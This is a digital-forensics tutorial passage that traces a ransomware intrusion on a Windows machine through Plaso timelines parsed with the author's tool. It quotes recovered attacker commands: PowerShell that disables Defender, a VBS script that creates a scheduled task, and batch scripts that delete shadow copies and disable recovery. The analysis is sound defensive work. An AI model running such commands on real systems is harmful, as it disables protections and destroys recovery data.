---
classes: wide
---


# Investigating a ransomware on a Windows machine using Maximum Plaso Parser

Usefull links:
* MPP is available [here](https://github.com/youhgo/maximumPlasoTimelineParser)
* DOPP is available [here](https://github.com/youhgo/DOPP)

In this article we will proceed to the investigation of a Windows machine infected with a ransomware, using the tool i made : Maximum Plaso Parser.


## What is MPP ?

MPP or MaximumPlasoParser is a python script that will parse a [plaso - Log2Timeline](https://github.com/log2timeline/plaso)  Json timeline file.
The goal is to regroup artefacts by categories in some easily readable and straight forward results.
MPP produces extremely simple and readable results, allowing analysts to find the information they need directly.

# Start the investigation

## Context
You are a forensic analyst and you have been contacted to investigate a windows machine that has been infected with a ransomware. The client only provided the Virtual Machine DisK (VMDK) of the machine.

## Vocabulary

**VMDK** : Virtual Machine Disk : VMDK is a file format that describes containers for virtual hard disk drives to be used in virtual machines like VMware Workstation or VirtualBox.


**MFT** : Master File Table : The Master File Table (MFT) is a system file in the NTFS file system (having the name $MFT) that stores metadata information about all files and directories on an NTFS volume. The MFT acts as an index to all the files and directories on the volume, providing quick access to the information needed to retrieve a file.


**USNJRNL** : Update Sequence Number Journal : The USN Journal (Update Sequence Number Journal), or Change Journal, is a feature of the Windows NT file system (NTFS) which maintains a record of changes made to the volume.


**Amcache** : AmCache is a component of the Application Compatibility Framework in Windows. it stores metadata about executables and other files that have been run or interacted with on the system. This includes information about when files were first executed.


**Shimcache** : ShimCache, also known as the Application Compatibility Cache, is a feature in Windows that helps maintain compatibility for older applications running on newer operating systems.


**VT** : Virus Total : Virus Total is an online service that analyzes suspicious files and URLs to detect types of malware and malicious content using antivirus engines and website scanners.


**Cobalt Strike**: Cobalt Strike is a tool developed for ethical hackers, but like many other offensive cybersecurity tools, it has fallen into the wrong hands. This powerful network attack platform combines social engineering, unauthorized access tools, network pattern obfuscation and a sophisticated mechanism for deploying malicious executable code on compromised systems. It can now be used by attackers to deploy advanced persistent threat (APT) attacks against your organization. [source](https://www.cynet.com/network-attacks/cobalt-strike-white-hat-hacker-powerhouse-in-the-wrong-hands/)


**Mimikatz**: Mimikatz is a now well known tool to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets. [source](https://github.com/gentilkiwi/mimikatz)




## Parsing the evidences


In this article we will use Log2Timeline and Maximum Plaso Parser to analyse the VMDK file provided.


To create the timeline with log2timeline :


```bash
psteal.py --source /home/hro/DFIR/BROCELIANDE_DC_Graal-disk1.vmdk -w full_timeline_graal.json -o json_line
```
Psteal.py  is tool which uses log2timeline and psort engines to parse all data in one go.
* – source is the path to the folder or file containing the data to be parsed
* -w is the result file
* -o json_line is the output format

Maximum Plaso Parser (MPP) needs a jsonline output format, that's why we use -o json_line and not csv.

Once we have the timeline we can parse it with MPP :
```bash
python3 MaximumPlasoParserJson.py -c "awesomeCase" --type "all" -o /home/hro/Documents/cyber/working_zone/testMP -t /home/hro/Documents/cyber/working_zone/samples_tl/full_timeline_graal.json  -m "Graal"
Started at: 01/22/2025, 16:55:45
result directory is located at : /home/hro/Documents/cyber/working_zone/testMP/mpp_Graal_2025-01-22T06:55:45
Finished in 75.00664639472961 secondes
```
* -c is our casename : awesomeCase
* --type is the output type of the file we want, here we set to "all" to have both json and CSV. I've done json to be able to do an ingestion on ELK for another article
* -o is the output directory
* -t is the plaso timeline we created before
* -m is the name of the machine, here it's DC_graal.


After ~75 secondes MPP has finished and produced multiples files:
```bash
tree
├── 4624usrLogon.csv
├── 4625usrFailLogon.csv
├── 4648usrExpLogon.csv
├── 4672usrSpeLogon.csv
├── 4688newProc.csv
├── 7045newService.csv
├── amcache.csv
├── applicationExperience.csv
├── bits.csv
├── ffHistory.csv
├── lnk.csv
├── mft.csv
├── mru.csv
├── powershell.csv
├── powershellScript.csv
├── prefetch.csv
├── rdpLocal.csv
├── rdpRemote.csv
├── runKey.csv
├── sam.csv
├── shimcache.csv
├── srum.csv
├── taskScheduler.csv
├── timeline.csv
├── usrAssist.csv
├── windefender.csv
├── winStartStop.csv
└── wmi.csv
```

Each file contains all entries for each artifact, sorted by datetime and easily readable.

For example, the Amcache:
```bash
head amcache.csv
Date|Time|Name|FullPath|id|Hash
1970-01-01|10:00:00|beacon.exe|c:\users\public\beacon.exe|0006d60e4d727c5556b492c242c0fa567c630000ffff|d5006bbcc79d52882acac909e7e9d9a4141af938d9f942981f5e0ae3bba5a62b
1972-10-12|15:40:16|iexplore.exe|c:\program files\internet explorer\iexplore.exe|0000f519feec486de87ed73cb92d3cac802400000000|d5006bbcc79d52882acac909e7e9d9a4141af938d9f942981f5e0ae3bba5a62b
1973-10-18|23:53:42|msiexec.exe|c:\windows\system32\msiexec.exe|0000f519feec486de87ed73cb92d3cac802400000000|d5006bbcc79d52882acac909e7e9d9a4141af938d9f942981f5e0ae3bba5a62b
```

## Determining a time window of the attack:

The only information we have is that the machine was hit by a ransomware.

During an investigation, time is crucial, so it's important to quickly assess a time window of the attack, in order not to search for irrelevant information.

We will search at what date and time the ransomware was executed, it will give us a timeframe of the attack.

Because we don't know what ransomware was executed nor the name of the binary, it's difficult to identify the ransomware in artefacts related to programs execution (amcache, shimcache, etc.) at the moment.


### Looking for file encryption

Here we will explore the MFT and look for the first encrypted file. We will search for a lot of file creation/modification having the same extension :
```bash
cut -d '|' -f6 mft.csv | awk -F'.' '{print $NF}' | sort | uniq -c | sort -nr | head -30
106016 manifest
93834 dll
47988 cat
  [...]
7340 byt
6909 dat
```

Here we can find the ".byt" extension with 7340 entries in the MFT.
".byt" extension file is characteristic of the Bytelocker ransomware. We can also find evidence of ".bytcrypttmp" file extension.

Let's get the date Time of the first file with that extension :
```bash
rg -i "\.byt" mft.csv | head -1
Date|Time|source|fileType|action|fileName
2021-01-07|04:03:12|USNJRNL|N/A|USN_REASON_FILE_CREATE|arrivée-dun-chaton-à-la-maison.jpg.byt
```

Keep in mind that the MFT is sometimes inaccurate regarding file modification.

If the date of the first encrypted file doesn't seem right you can look for the first ransom note left by the ransomware as they are neither modified nor encrypted.

In this case we don't have any readme file associated with bytelocker.exe

__The first encrypted file gives us a timestamp the 2021-01-07 at 04:03:12__


### Looking for program execution:


The first encrypted file gives us a time frame at the 2021-01-07 04:03:12, let's check what programs were executed around this period. We will look into the Amcache, Shimcache and User Assist :


```bash
usrAssist.csv
2021-01-07|03:58:58.054000|C:\Users\Public\Bytelocker.exe|0|0
2021-01-07|04:00:50.164000|C:\Users\arthur\Documents\confidentiel\Bytelocker.exe|0|0
[...]


shimcache.csv
2021-01-07|03:56:55.101887|Bytelocker.exe|C:\Users\Public\Bytelocker.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
2021-01-07|04:02:57.273187|Bytelocker.exe|C:\Users\Arthur\Documents\confidentiel\Bytelocker.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
[...]

amcache.csv
Date|Time|Name|FullPath|id|Hash
2040-01-05|12:07:17|bytelocker.exe|c:\users\public\bytelocker.exe|0006325d14a30ff7987e661f1b3bcca4b51100000000|d5006bbcc79d52882acac909e7e9d9a4141af938d9f942981f5e0ae3bba5a62b
```

Here we can find multiple entries, from Bytelocker, a well known ransomware. There is also some entries into the amcache but the timestamp is faulty.

Contrary to the amcache, an entry in the shimcache doesn't necessarily mean the program was executed. But we can correlate evidence from the user assist, the successful encryption of the first file to assume that it was indeed executed at that time.

__Programs execution gives us a timestamp the 2021-01-07 at 03:56:55__


---

__By correlating the evidence found in the filesystem and in programs execution artefact, we can define a 1st time window to focus on. Its start from 03:00:00 to 05:00:00 AM on January 07 2021.__

---


## Identifying malicious Users

Lets check what users were connected at that time. The time window is in the middle of the night so results might not get polluted by legit connections.

Security event id 4624 registers all connections to the machine. Let search at 3 am for all the account name that where connected:

```bash
rg -i "2021-01-07\|03" user_logon_id4624.csv | cut -d '|' -f5 | sort | uniq -c
2 Administrator
23 arthur
1 DWM-2
151 GRAAL$
196 MSOL_0537fce40030
3 SYSTEM
24 TAVERNE$
1 UMFD-2
```

We can see multiple services accounts as well as computers accounts.


__We can identify the accounts "Administrator" and "arthur" as suspicious as they are the only "human account".__


Let’s search for a bigger window (3 and 4 am) :


```bash
rg -i "2021-01-07\|0[3-4]" user_logon_id4624.csv | rg -i "administrator|arthur"
Date|Time|event_code|subject_user_name|target_user_name|ip_address|ip_port|logon_type
2021-01-07|03:28:22|4624|-|Administrator|192.168.88.137|53942|3
2021-01-07|03:28:41|4624|-|Administrator|192.168.88.137|53952|3
2021-01-07|03:31:38|4624|-|arthur|192.168.88.137|54028|3
[...]
2021-01-07|03:33:59|4624|-|arthur|192.168.88.137|54180|3
2021-01-07|03:34:49|4624|GRAAL$|arthur|127.0.0.1|0|7
2021-01-07|03:35:06|4624|-|arthur|192.168.88.137|45860|3
[...]
2021-01-07|03:45:07|4624|-|arthur|192.168.88.137|46212|3
2021-01-07|03:46:36|4624|GRAAL$|arthur|127.0.0.1|0|7
2021-01-07|03:47:07|4624|-|arthur|192.168.88.137|46298|3
[...]
2021-01-07|03:55:08|4624|-|arthur|192.168.88.137|46482|3
2021-01-07|03:55:16|4624|GRAAL$|arthur|127.0.0.1|0|2
2021-01-07|03:57:09|4624|-|arthur|192.168.88.137|46576|3
[...]
2021-01-07|04:27:14|4624|-|arthur|192.168.88.137|47434|3
```

All of the above connections come from the same ip 192.168.88.137 and are with type 3 (SMB).
We can assume that the attacker compromised the machine 192.168.88.137 before pivoting on this one.
It's good practice to check with the client wherever those connections are legit or not. Sometimes, clients can be in another timezone and therefore work during our night time, so a connection at 3am could be legit. Our client has confirmed that nobody was working at that time.

---

__The first malicious connection identified on this machine was made on the "2021-01-07" at "03:28:22" by the account "Administrator from the ip 192.168.88.137"__.

---


As you will see later the account "arthur" is also compromised.


## Identifying malicious actions


The connections we saw above are in SMB, an action should be linked.


Let’s see what happens after the first connection:


```bash
rg -iN "2021-01-07\|03:28:2." *.csv


user_logon_id4624.csv
Date|Time|event_code|logon_type|subject_user_name|target_user_name|ip_address|ip_port
2021-01-07|03:28:22|4624|-|Administrator|192.168.88.137|53942|3
2021-01-07|03:28:23|4624|GRAAL$|SYSTEM|-|-|5


user_special_logon_id4672.csv
Date|Time|event_code|logon_type|subject_user_name|target_user_name|ip_address|ip_port
2021-01-07|03:28:22|4672|Administrator|-|-|-|-
2021-01-07|03:28:23|4672|SYSTEM|-|-|-|-


new_service_id7045.csv
Date|Time|event_code|account_name|img_path|service_name|start_type
2021-01-07|03:28:22|7045|LocalSystem|%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat|BTOBTO


windefender.csv
Date|Time|Event|ThreatName|Severity|User|ProcessName|Path|Action
2021-01-07|03:28:23|1116 - Detection|VirTool:Win32/MSFPsExecCommand|Severe|NT AUTHORITY\SYSTEM|Unknown|CmdLine:_C:\Windows\System32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat|Not Applicable
```

We have interesting things going on here; let's break through __connections__, __service__ and __antivirus detection__.


### Connections

Windows Security event id 4625 and 4672 register user logons and user privilegied logons:
```
user_logon_id4624.csv
Date|Time|event_code|logon_type|subject_user_name|target_user_name|ip_address|ip_port
2021-01-07|03:28:22|4624|-|Administrator|192.168.88.137|53942|3
2021-01-07|03:28:23|4624|GRAAL$|SYSTEM|-|-|5


user_special_logon_id4672.csv
Date|Time|event_code|logon_type|subject_user_name|target_user_name|ip_address|ip_port
2021-01-07|03:28:22|4672|Administrator|-|-|-|-
2021-01-07|03:28:23|4672|SYSTEM|-|-|-|-
```

We can see that the account "Administrator" was connected using SMB (type 3). We can also see that the SYSTEM account is connected using type 5, meaning that a service starts and the service account logs into the local system. SYSTEM and Administrator are privileged accounts, that is why we have 4672 log entries paired with the 4624.


__The account Administrator was connected and started a service on the machine__



#### Services


A new service was started on the machine, system event id 7045 register the creation of new services  :


```bash
new_service_id7045.csv
Date|Time|event_code|account_name|img_path|service_name
2021-01-07|03:28:22|7045|LocalSystem|%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat|BTOBTO
```


The service contains the following command line, let's explain :
```bat
%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
```


#### The first part:

Let’s inspect the first part of the commande line:
```bash
%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat
```

The begining part :
```bash
%COMSPEC% /Q /c echo
```
* %COMSPEC%: This environment variable typically points to the command interpreter (cmd.exe).
* /Q: Runs the command interpreter in quiet mode.
* /c: Executes the following command and then exits.
* "echo":  This command is used to output text to the console or a file.


__This command will run a terminal and then write some text into a file or console.__


The middle part, this is the text that will be written to the file, it's also a command but it won't be executed yet :
```bash
cd ^> \\127.0.0.1\C$\__output 
```
* "cd": This command changes the current directory.
* "^> \\127.0.0.1\C$\__output": This part specifies the new directory.
* "\\127.0.0.1": Represents the local machine.
* "C$"": This is an administrative share of the local C: drive. Accessing it requires elevated privileges.
* "__output": This is the target subdirectory within the C: drive.


__This command will be written into a file or console.__


Finaly 
```batch
2^>^&1 > %TEMP%\execute.bat
```
* "2^>^&1": This redirects both standard error (2) and standard output (1) to the same location.
* "\> %TEMP%\execute.bat": This redirects the output of the echo command to a file named execute.bat within the temporary directory (%TEMP%). This effectively creates a batch file.


__To Sum up, the whole command will launch a terminal and creates a batch file named execute.bat in the temp directory, which when run, will write the current directory to \\127.0.0.1\C$\__output.__



#### The second part :


Let’s inspect the second pard of the commande line:
```bash
%COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat|BTOBTO
```
* "%COMSPEC% /Q /c %TEMP%\execute.bat" : This cmd executes the execute.bat file that was just created.
* "del %TEMP%\execute.bat": This deletes the temporary execute.bat file after it has been executed.
* "BTOBTO" This part redirects the output of the entire command sequence to another process or file named "BTOBTO." The nature of "BTOBTO" is unknown from this command alone.


__This command will execute then delete the batch file created previously.__




**In conclusion, the full command will launch a terminal and create, then execute and finally delete a batch file named "execute.bat" in the temp directory. When run, the batch script will change the current directory to \\127.0.0.1\C$\__output.**


### Anti Virus hits


Windows defender detected and blocked some threats;
Windows Defender Event log ID 1116 register when a threat is detected and Event log ID 1117 log the action performed in reaction to the previously detected threat.
```bash
windefender.csv
Date|Time|Event|ThreatName|Severity|User|ProcessName|Path|Action
2021-01-07|03:28:23|1116 - Detection|VirTool:Win32/MSFPsExecCommand|Severe|NT AUTHORITY\SYSTEM|Unknown|CmdLine:_C:\Windows\System32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat|Not Applicable
[...]
2021-01-07|03:28:38|1117 - Action|VirTool:Win32/MSFPsExecCommand|Severe|NT AUTHORITY\SYSTEM|Unknown|Remove
```

By checking the timeline we can see that the attacker tried to execute that service 4 times without success, he tried with user "arthur" and "Administrator".


__Windows Defender anti-virus identified the service previously created by the attacker as a Severe threat and removed it/blocked it__.


---

__On the 2021-01-07 at 03:28, the attacker tried to execute malicious commands through the creation of news services, using the users "arthur" and "Administrator". All the actions where blocked by the anti-virus.__

---


## Owning the machine


### Deploying tools


As we keep going, we spot a connection from user "arthur" and multiple anti-virus hits with "mimikatz.exe" and "beacon.exe".


```bash
timeline.csv
2021-01-07|03:35:06|4624|-|arthur|192.168.88.137|45860|3


2021-01-07|03:35:43|USNJRNL|N/A|USN_REASON_DATA_EXTEND USN_REASON_FILE_CREATE|mimikatz.exe
2021-01-07|03:35:44|1116 - Detection|HackTool:Win32/Mimikatz.D|High|BROCELIANDE\arthur|C:\Users\Public\beacon.exe|file:_C:\Users\Public\mimikatz.exe|Not Applicable
2021-01-07|03:35:45|1116 - Detection|HackTool:Win64/Atosev.A|High|NT AUTHORITY\SYSTEM|C:\Users\Public\beacon.exe|file:_C:\Users\Public\beacon.exe|Not Applicable


2021-01-07|03:35:46|1116 - Detection|Behavior:Win32/Atosev.D!sms|Severe|-|C:\Users\Public\beacon.exe|behavior:_pid:5172:41451891338358; process:_pid:5172,ProcessStart:132544280605139768|Not Applicable
2021-01-07|03:35:46|1117 - Action|Behavior:Win32/Atosev.D!sms|Severe|-|C:\Users\Public\beacon.exe|Remove
2021-01-07|03:35:59|1117 - Action|HackTool:Win32/Mimikatz.D|High|BROCELIANDE\arthur|C:\Users\Public\beacon.exe|Quarantine
```

We will see more about "Mimikatz.exe" and "Beacon.exe" later on this article.

__On the 2021-01-07 at 03:35, the attacker tried to deploy the binaries "mimikatz.exe" and "beacon.exe" without success thanks to the anti-virus.__


### Disabling protections:

A powershell cmd is executed, Windows Powershell event id 600 register powershell command that have been executed on the machine.
```bash
powershell.csv
Date|Time|event_code|cmd
2021-01-07|03:37:03|600|powershell Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
```

This command disables the real time monitoring of the AV and checks the AV status.


__On the 2021-01-07 at 03:37:03, the attacker successfully disabled the anti-virus with a powershell command.__



### Privilege escalation

We notice a connection by user "arthur" and the creation of the file beacon.exe.

```bash
timeline.csv
2021-01-07|03:37:06.374663|4672usrSpeLogon|4672|arthur|-|-|-|-
2021-01-07|03:37:06.374766|4624usrLogon|4624|-|arthur|192.168.88.137|45990|3
[...]
2021-01-07|03:37:12.855915|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|beacon.exe
[...]
2021-01-07|03:37:24.672126|windefender|1116 - Detection|HackTool:Win64/Atosev.A|High|NT AUTHORITY\SYSTEM|Unknown|file:_C:\Users\Public\beacon.exe|Not Applicable
```

The file "beacon.exe" was detected by the anti-virus but this time no remediation action was performed as we don't have any related event ID 1117 from the Anti-virus.

The exe was still on the disk so i could get more informations about it :
```bash
md5sum beacon.exe
4f3df018ea5e4eb39c9cc5c55050a92b  beacon.exe
```

Info from Virus Total indicates that it's a beacon from Cobalt Strike.

We can extract the config from the beacon with the tool "[csce](https://github.com/strozfriedberg/cobaltstrike-config-extractor)" :

```json
"server": {
  "hostname": "20.39.243.236",
  "port": 80,
  "publickey": "MIGfMA0GCSqAAA[...]AAAAAAA=="
  [...]
}
```

We get the IP of the C2.
This IP is related to many malicious binary (source VT) :
```text
2022-01-12  31/ 68 Win32 EXE  beacon.exe
2024-12-19  37/ 64 ELF          stage2.elf
2023-02-17  47/ 71 Win32 EXE  beacon.exe
2023-02-22  49/ 70 Win32 EXE  copain.exe
2024-05-29  52/ 74 Win32 EXE  executable.2488.exe
```

__On the 2021-01-07 at 03:37:24 the attacker successfully implanted a malicious remote access tool on the filesystem.__


With the Anti-virus down, we see the successful connection of user "arthur", the creation of the file "mimikatz.exe" and its entry into the Shimcache :

```bash
timeline.csv
2021-01-07|03:41:06.888806|4672usrSpeLogon|4672|arthur|-|-|-|-
2021-01-07|03:41:06.888956|4624usrLogon|4624|-|arthur|192.168.88.137|46108|3
[...]
2021-01-07|03:41:21.621575|mft|FILESTAT|file|Creation Time|\Users\Public\mimikatz.exe
[...]
2021-01-07|03:41:21.902393|shimcache|mimikatz.exe|C:\Users\Public\mimikatz.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
```

Mimikatz is a powerful tool allowing an attacker to manipulate kerberos tickets, dumping users credentials and more. It's often used as a way to gain higher privileges.


__On the 2021-01-07 at 03:41 the attacker successfully executed the binary "mimikatz.exe". Since there is no command history of the tool, we cannot identify what the attacker did.__

---

__On the 2021-01-07 at 03:37:24 the attacker successfully disabled the anti-virus, implanted a remote access tool on the filesystem and used a tool to manipulate credentials and user authentication.__

---


## Launching the ransomwares

### Bytelocker

As we continue to investigate, we find a successful RDP connexion and some entries from bytelocker.exe, an infamous ransomware in the shimcache, user_assist and the MFT:

```bash
timeline.csv
2021-01-07|03:55:16.043038|4648usrExpLogon|4648|GRAAL$|arthur|127.0.0.1|0|-
2021-01-07|03:55:16.043065|4624usrLogon|4624|GRAAL$|arthur|127.0.0.1|0|2
2021-01-07|03:55:16.043094|4672usrSpeLogon|4672|arthur|-|-|-|-
2021-01-07|03:55:16.301111|rdpLocal|21|BROCELIANDE\arthur|-|2|-|-|-|AuthSuccess
[...]
2021-01-07|03:56:17.120954|4672usrSpeLogon|4672|GRAAL$|-|-|-|-
2021-01-07|03:56:17.121054|4624usrLogon|4624|-|GRAAL$|192.168.88.135|56719|3
[...]
2021-01-07|03:56:55.101887|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|Bytelocker.exe
2021-01-07|03:56:55.101887|shimcache|Bytelocker.exe|C:\Users\Public\Bytelocker.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
[...]
2021-01-07|03:58:58|user_assist|C:\Users\Public\Bytelocker.exe|0|0
2021-01-07|04:00:50|user_assist|C:\Users\arthur\Documents\confidentiel\Bytelocker.exe|0|0
```

We can see that the ransomware was dropped at multiple places:
* \Users\arthur\Documents\confidentiel\Bytelocker.exe
* \Users\arthur\Documents\Bytelocker.exe
* \Users\Public\Bytelocker.exe


The md5 of the file "bytelocker.exe" is : b8ef6e365a55a0ec96c19c61f1bce476. 

A quick search on VirusTotal confirm that the ransomware is truly bytelocker.

As i explained earlier, an entry in the shimcache doesn't mean that the binary was exectued. We know from the amcache that it was, but the timestamps were faulty. In this case we can't be certain of the true timestamp of the execution.

__On the 2021-01-07 between 03:56 and 03:58, the ransomware Bytelocker was executed for the first time on the machine__

The ransomware execution might have failed as we see another tentative later on:


```bash
timeline.csv
2021-01-07|04:01:09.520882|4672usrSpeLogon|4672|arthur|-|-|-|-
2021-01-07|04:01:09.521008|4624usrLogon|4624|-|arthur|192.168.88.137|46658|3
2021-01-07|04:02:57.273187|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|Bytelocker.exe
2021-01-07|04:02:57.273187|shimcache|Bytelocker.exe|C:\Users\Arthur\Documents\confidentiel\Bytelocker.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
```

This tentative was successful as we can witness the encryption of many files few seconds later:


```bash
timeline.csv
2021-01-07|04:03:18.460768|mft|USNJRNL|N/A|USN_REASON_DATA_EXTEND USN_REASON_FILE_CREATE|arrivée-dun-chaton-à-la-maison.jpg.byt
2021-01-07|04:03:18.570408|mft|USNJRNL|N/A|USN_REASON_DATA_EXTEND USN_REASON_FILE_CREATE USN_REASON_CLOSE|arrivée-dun-chaton-à-la-maison.jpg.byt
2021-01-07|04:03:18.570408|mft|USNJRNL|N/A|USN_REASON_FILE_DELETE USN_REASON_CLOSE|arrivée-dun-chaton-à-la-maison.jpg
2021-01-07|04:03:18.570408|mft|USNJRNL|N/A|USN_REASON_RENAME_NEW_NAME USN_REASON_OBJECT_ID_CHANGE USN_REASON_CLOSE|arrivée-dun-chaton-à-la-maison.jpg
2021-01-07|04:03:18.570408|mft|USNJRNL|N/A|USN_REASON_RENAME_NEW_NAME USN_REASON_OBJECT_ID_CHANGE|arrivée-dun-chaton-à-la-maison.jpg
2021-01-07|04:03:18.570408|mft|USNJRNL|N/A|USN_REASON_RENAME_OLD_NAME USN_REASON_OBJECT_ID_CHANGE|arrivée-dun-chaton-à-la-maison.jpg.byt
```

__On the 2021-01-07 around 04:02, the ransomware was executed for the second time on the machine. The file encryption started at 04:03:18.__


The ransomware added an entry to the runkey, probably for persistence.
Run or RunOnce registry keys are used to make a program run when a user logs on. The Run key makes the program run every time the user logs on.
These keys can be set for the user or the machine.

```bash
timeline.csv
2021-01-07|04:05:58.398303|runKey|Bytelocker: "C:\Users\arthur\AppData\Roaming\{86ff23e9-f09f-4ca4-ae3d-41fe11fbabcd}.exe"
```
__On the 2021-01-07 at 04:05:58, a entry in the registry key "run" was created as a way of persistence.__


---

__On the 2021-01-07 from 03:56 to 04:05, the attacker successfully executed the ransomware Bytelocker on the machine and created a persistence for it in the registry key.__

---


### Matrix Ransomware


As we continue the investigation, we can spot the creation of the following binary:

```bash
2021-01-07|04:19:41.086045|shimcache|NWcurdcz.exe|C:\Users\Administrator\Documents\NWcurdcz.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
```

It wasn't on the disk anymore so i could not dig deeper.

By Investigating further online, this binary looks like the initial payload of the ransomware. 

It match the IOC name that match the regex : NW[a-zA-Z]{6}\.exe and seconds later, multiples scripts, binaries and scheduled tasks are created, they are characteristic of Matrix ransomware:
```bash
timeline.csv
2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|ATXO3fAc.exe
2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|CEp5f0ji.bat
2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|M1nLSX9d.bat
2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|zTYfgvad.vbs
2021-01-07|04:20:51.023841|shimcache|ATXO3fAc.exe|C:\Users\Administrator\Documents\ATXO3fAc.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
[...]
2021-01-07|04:20:53.116940|mft|FILESTAT|file|Creation Time|\Users\Administrator\Documents\bad_3F79A31A837D5316.txt
[...]
2021-01-07|04:21:13.728579|taskScheduler|106|-|\DSHCA|-|-|-|-|BROCELIANDE\arthur
2021-01-07|04:21:13.728581|taskScheduler|140|-|\DSHCA|-|-|-|BROCELIANDE\arthur|-
2021-01-07|04:21:22.952657|taskScheduler|200|-|\DSHCA|-|C:\Windows\SYSTEM32\cmd.exe|-|-|-
[...]
2021-01-07|04:44:43.875135|taskScheduler|201|-|\DSHCA|-|C:\Windows\SYSTEM32\cmd.exe|3221225786|-|-
```

By looking at the MD5 of the file ATXO3fAc.exe, we can see that it is "Nthandle.exe" from sysinternals.


```bash
md5sum ATXO3fAc.exe
2f5b509929165fc13ceab9393c3b911d  ATXO3fAc.exe
```

Nthandle.exe his a legitimate tool from Sysinternals that allows the user to close any handle on a file.
A Windows file handle is a crucial mechanism that enables programs to interact with files in a structured and secured manner.


The binary is used in the script CEp5f0ji.bat
```bash
cacls %1 /E /G %USERNAME%:F /C
takeown /F %1
set FN="%~nx1"
cd /d "%~dp0"
FOR /F "UseBackQ Tokens=3,6 delims=: " %%I IN (`ATXO3fAc.exe -accepteula %FN% -nobanner`) DO (ATXO3fAc.exe -accepteula -c %%J -y -p %%I -nobanner)
```

This script grants the current user full control over a specified file and takes ownership of it.
Then it uses the binary ATXO3fAc.exe (Nthandle.exe) to close any handle related to the file.

This script allows the attacker to deal with file permission and handles as they could prevent file encryption.


__On the 2021-01-07 at 04:20:51, the attacker successfully deployed a batch script and the executable ATXO3fAc.exe__


The file bad_3F79A31A837D5316.txt contain a list of file and exe, it's a log file for the ransomware :

```bash
ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Start Menu\Programs\Immersive Control Panel.lnk
ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\Templates\SettingsLocationTemplate2013.xsd
ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\AppV\Setup\OfficeIntegrator.ps1
[...]
```

Now let’s take a look at the script zTYfgvad.vbs :

```batch
Option Explicit
dim W
Set W = CreateObject("Wscript.Shell")
W.Run "cmd.exe /C schtasks /Create /tn DSHCA /tr ""C:\Users\arthur\AppData\Roaming\M1nLSX9d.bat"" /sc minute /mo 5 /RL HIGHEST /F", 0, True
W.Run "cmd.exe /C schtasks /Run /I /tn DSHCA", 0, False
```

This script creates a scheduled task named "DSHCA" that runs the batch file "M1nLSX9d.bat" every 5 minutes with the highest privileges.
Then, it immediately runs the newly created task.


__On the 2021-01-07 at 04:21:13, the attacker successfully created a scheduled task name DSHCA using a visual basic script__


Here is the content of the file : M1nLSX9d.bat
```batch
vssadmin Delete Shadows /All /Quiet
wmic SHADOWCOPY DELETE
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
del /f /q "C:\Users\arthur\AppData\Roaming\zTYfgvad.vbs"
SCHTASKS /Delete /TN DSHCA /F
del /f /q %0
```

This script will:
* Completely remove system restore points and shadow copies.
* Disable Windows Recovery Environment and suppress boot error messages.
* Delete the file zTYfgvad.vbs we saw above.
* Delete the DSHCA scheduled task we saw above.
* Delete itself.


__On the 2021-01-07 at 04:21:13, the attacker successfully deleted all shadow copy and backups using the scheduled task name DSHCA__


A few second after the execution of the binary ATXO3fAc.exe, a file name "#README_CTRM#.rtf" is created on the disk:
```bash
2021-01-07|04:20:59.382650|mft|FILESTAT|file|Creation Time|\Users\Administrator\#README_CTRM#.rtf
```

After extracting it from the disk, we can get it's content:

```crtf
Аll yоur vаluаblе dаtа hаs bееn еnсryptеd!
Hеllо!
